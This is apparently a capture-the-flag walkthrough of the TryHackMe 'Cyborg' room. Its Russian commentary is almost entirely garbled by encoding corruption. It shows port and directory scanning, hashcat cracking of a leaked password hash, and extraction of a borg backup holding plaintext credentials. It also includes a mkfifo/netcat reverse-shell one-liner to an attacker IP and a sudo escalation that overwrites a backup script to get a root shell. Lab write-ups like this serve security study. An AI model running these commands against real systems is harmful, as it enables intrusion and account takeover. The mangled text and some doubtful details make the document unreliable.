https://tryhackme.com/room/cyborgt8

1) nmap -A -sV -O <IP-machine>
Ð½Ð¸Ñ‡ÐµÐ³Ð¾ Ð¸Ð½Ñ‚ÐµÑ€ÐµÑÐ½Ð¾Ð³Ð¾, 22-ssh and 88-http

2)â””â”€# gobuster -e -u dir http://10.10.189.113  -w /root/Downloads/common.txt
Ñ‚ÑƒÑ‚ ÑƒÐ¶Ðµ Ð¸Ð½Ñ‚Ñ€ÐµÑÐ½ÐµÐµ ÑÑ‚Ñ€Ð°Ð½Ð¸Ñ†Ñ‹ : admin, etc
Ð² etc Ñ Ð½Ð°Ñ…Ð¾Ð¶Ñƒ squid>
passwd Ñ„Ð°Ð¹Ð» Ð² ÐºÐ¾Ñ‚Ð¾Ñ€Ð¾Ð¼ : 
 music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

3)â””â”€# hashcat -m 1600 /root/Desktop/us.txt /root/Downloads/rockyou.txt
Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ñ€Ð°ÑÑˆÐ¸Ñ„Ñ€Ð¾Ð²Ð°Ñ‚ÑŒ Ñ…ÑÑˆ Ð½Ð°Ñ…Ð¾Ð¶Ñƒ Ð½ÐµÐ¾Ð±Ñ…Ð¾Ð´Ð¸Ð¼Ñ‹Ð¹ Ð¼Ð¾Ð´ Ð·Ð´ÐµÑÑŒ https://hashcat.net/wiki/doku.php?id=example_hashes

Ð¾ÐºÐµÐ¹ Ñ€Ð°ÑÑˆÐ¸Ñ„Ñ€Ð¾Ð²Ð°Ð»Ð¾ÑÑŒ Ð²ÑÐµ Ð´Ð¾Ð²Ð¾Ð»ÑŒÐ½Ð¾ Ð±Ñ‹ÑÑ‚Ñ€Ð¾ 
 $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward

Ð¿Ð¾Ð¿Ñ‹Ñ‚Ð°Ð»Ð°ÑÑŒ Ð·Ð°Ð¹Ñ‚Ð¸ Ð½Ð° ssh
â””â”€# ssh music_archive@10.10.189.113 

Ð½Ðµ Ð²Ñ‹ÑˆÐ»Ð¾ Ð¿Ð°Ñ€Ð¾Ð»ÑŒ Ð½Ðµ Ð²ÐµÑ€Ð½Ñ‹Ð¹

4)Ð·Ð°ÑˆÐ»Ð° Ñ‹ extract.tar ÐºÐ¾Ñ‚Ð¾Ñ€Ñ‹Ð¹ ÑÐºÐ°Ñ‡Ð°Ð»Ð° Ð¸Ð· Ð¿Ð°Ð½ÐµÐ»Ð¸ Ð°Ð´Ð¼Ð¸Ð½Ð¸ÑÑ‚Ñ€Ð°Ñ‚Ð¾Ñ€Ð° admin, Ð² Ñ„Ð°Ð¹Ð»Ðµ readme Ð±Ñ‹Ð»Ð° ÑÑÑ‹Ð»ÐºÐ° Ð½Ð° ÑÐ°Ð¹Ñ‚ https://borgbackup.readthedocs.io/en/stable

Ð¸ ÑƒÐ¶Ðµ Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ Ð¸Ð½Ñ‚ÐµÑ€Ð½ÐµÑ‚Ð° Ñ Ð¿ÐµÑ€ÐµÑˆÐ»Ð° Ð½Ð° https://borgbackup.readthedocs.io/en/stable/usage/extract.html, Ñ‚Ð°Ð¼ Ð±Ñ‹Ð»Ð° Ð¸Ð½ÑÑ‚Ñ€ÑƒÐºÑ†Ð¸Ñ ÐºÐ°Ðº Ð¸Ð·Ð²Ð»ÐµÑ‡ÑŒ Ñ„Ð°Ð¹Ð»Ñ‹ Ð¸Ð· Ñ‚Ð°Ñ€Ð°

â”Œâ”€â”€(rootðŸ’€kali)-[/tmp]
â””â”€# borg extract /tmp/mozilla_root0/home/field/dev/final_archive::music_archive     ÑÑ‚Ð¾ Ð¼Ð¾Ð¹ Ð»Ð¾Ð³Ð¸Ð½
Enter passphrase for key /tmp/mozilla_root0/home/field/dev/final_archive:squidward      ÑÑ‚Ð¾ Ñ€Ð°ÑÑ…ÑÑˆÐ¸Ñ€Ð¾Ð²Ð°Ð½Ð½Ñ‹Ð¹ Ð¿Ð°Ñ€Ð¾Ð»ÑŒ

Ð¿Ð¾ÑÐ»Ðµ ÑƒÐ´Ð°Ñ‡Ð½Ð¾Ð³Ð¾ Ð²Ð²Ð¾Ð´Ð° Ð¿Ð°Ñ€Ð¾Ð»Ñ Ð²Ð¸Ð¶Ñƒ Ð¿Ð¾ÑÐ²Ð¸Ð»Ð°ÑÑŒ Ð½Ð¾Ð²Ð°Ñ Ð¿Ð°Ð¿ÐºÐ° /home Ð¾Ðº Ð·Ð°ÑˆÐ»Ð° Ð² Ð½ÐµÐµ
Ð² Ð½ÐµÐ¹ Ð±Ñ‹Ð» Ð¿Ð¾Ð»ÑŒÐ·Ð¾Ð²Ð°Ñ‚ÐµÐ»ÑŒ /alex Ð¿ÐµÑ€ÐµÑˆÐ»Ð° Ð² Ð½ÐµÐ³Ð¾ Ð¸ Ð² Ð´Ð¾ÐºÑƒÐ¼ÐµÐ½Ñ‚Ð°Ñ‡ Ð¾Ð±Ð½Ð°Ñ€ÑƒÐ¶Ð¸Ð»Ð° Ñ„Ð°Ð¹Ð» Ñ Ð»Ð¾Ð³Ð¸Ð½Ð¾Ð¼ Ð¸ Ð¿Ð°Ñ€Ð¾Ð»ÐµÐ¼ alex:S3cretP@s3

5) Ð¿Ð¾ÑÐ»Ðµ ÑƒÑÐ¿ÐµÑˆÐ½Ð¾Ð³Ð¾ Ð²Ñ…Ð¾Ð´Ð° Ð½Ð° ssh
â””â”€# ssh alex@10.10.189.113 
Ñ Ð¿Ð°Ñ€Ð¾Ð»ÐµÐ¼ S3cretP@s3 Ñ Ð±Ñ‹ÑÑ‚Ñ€Ð¾ Ð¾Ð±Ð½Ð°Ñ€ÑƒÐ¶Ð¸Ð»Ð° Ñ„Ð°Ð¹Ð» user.txt

6) sudo -l
Ñ‡Ñ‚Ð¾Ð±Ñ‹ ÑƒÐ·Ð½Ð°Ñ‚ÑŒ ÐºÐ°ÐºÐ¸Ðµ ÐºÐ¾Ð¼Ð°Ð½Ð´Ñ‹ Ð¼Ð¾Ð³Ñƒ Ð²Ñ‹Ð¿Ð¾Ð»Ð½ÑÑ‚ÑŒ Ð¾Ñ‚ Ð¸Ð¼ÐµÐ½Ð¸ root

 User alex may run the following commands on ubuntu: 
     (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh

Ð¾Ðº Ð¿Ñ€Ð¾Ñ‡Ð¸Ñ‚Ð°ÐµÐ¼ ÑÑ‚Ð¾Ñ‚ Ð·Ð°Ð³Ð°Ð´Ð¾Ñ‡Ð½Ñ‹Ð¹ Ñ„Ð°Ð¹Ð» 
Ð¾Ð½ ÐºÐ°Ðº ÑÐ²ÑÐ·Ð°Ð½ Ñ /etc/mp3backups/backed_up_files.txt
Ñ Ð´ÑƒÐ¼Ð°Ð»Ð° ÐºÐ°Ðº Ð² Lazy Admin Ð½Ð°Ð´Ð¾ Ð´Ð¾Ð±Ð°Ð²Ð¸Ñ‚ÑŒ ÑÑ‚Ñ€Ð¾Ñ‡ÐºÑƒ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.64 1111 >/tmp/f" > /etc/copy.sh Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð¾Ð½ ÑÐºÐ¾Ð½ÐµÐºÑ‚Ð¸Ð»ÑÑ ÑÐ¾ Ð¼Ð½Ð¾Ð¹ Ð¸ Ñ Ð¼Ð¾Ð³Ð»Ð° ÑƒÐ¿Ñ€Ð°Ð²Ð»ÑÑ‚ÑŒ

Ð½Ð¾ Ð² Ð¸Ð½ÐµÑ‚Ðµ Ñ Ð½Ð°ÑˆÐ»Ð° ÑÐ¾Ð²ÐµÑ€ÑˆÐµÐ½Ð½Ð¾ Ð¸Ð½Ð¾Ð¹ ÑÐ¿Ð¾ÑÐ¾Ð±

7)
chmod +w /etc/mp3backups/backup.sh      Ð¿Ð¾Ð²Ñ‹ÑˆÐ°ÑŽ Ñ€Ð°Ð·Ñ€ÐµÑˆÐµÐ½Ð¸Ð¹ Ð´Ð»Ñ Ñ‚Ð¾Ð³Ð¾ Ñ‡Ñ‚Ð¾Ð±Ñ‹ Ð¸Ð¼ÐµÑ‚ÑŒ Ð²Ð¾Ð·Ð¼Ð¾Ð¶Ð½Ð¾ÑÑ‚ÑŒ Ð´Ð¾Ð¿Ð¸ÑÑ‹Ð²Ð°Ñ‚ÑŒ Ð² Ñ„Ð°Ð¹Ð»
cat > /etc/mp3backups/backup.sh << EOF    Ð²Ð²Ð¾Ð¶Ñƒ Ñ‚ÐµÐºÑÑ‚ Ð´Ð¾ Ñ‚ÐµÐ¿ Ð¿Ð¾Ñ€ Ð¿Ð¾ÐºÐ° Ð½Ðµ Ð²Ð²ÐµÐ´Ñƒ  EOF   
   #!/bin/bash
    /bin/bash
    EOF

sudo /etc/mp3backups/backup.sh      Ð¿Ð¾ÑÐ»Ðµ Ð·Ð°Ð¿ÑƒÑÐºÐ° backup.sh Ð¾Ñ‚ Ð¸Ð¼ÐµÐ½Ð¸ Ð°Ð´Ð¼Ð¸Ð½Ð¸ÑÑ‚Ñ€Ð¾Ñ‚Ð¾Ñ€Ð° Ñ ÑÑ‚Ð°Ð½Ð¾Ð²Ð»ÑŽÑÑŒ Ñ€ÑƒÑ‚Ð¾Ð¼ Ð¸ Ñ‡Ð¸Ñ‚Ð°ÑŽ /root/root.txt


Ð½Ð° Ð²ÑÑÐºÐ¸Ð¹ ÑÐ»ÑƒÑ‡Ð°Ð¹ https://0xsanz.medium.com/cyborg-tryhackme-c96b8ca6c1
ÐºÐ°Ðº ÑÐºÐ¾Ð½Ð½ÐµÐºÑ‚Ð¸Ñ‚ÑŒÑÑ Ñ Ð¿Ð¾Ð¼Ð¾Ñ‰ÑŒÑŽ nc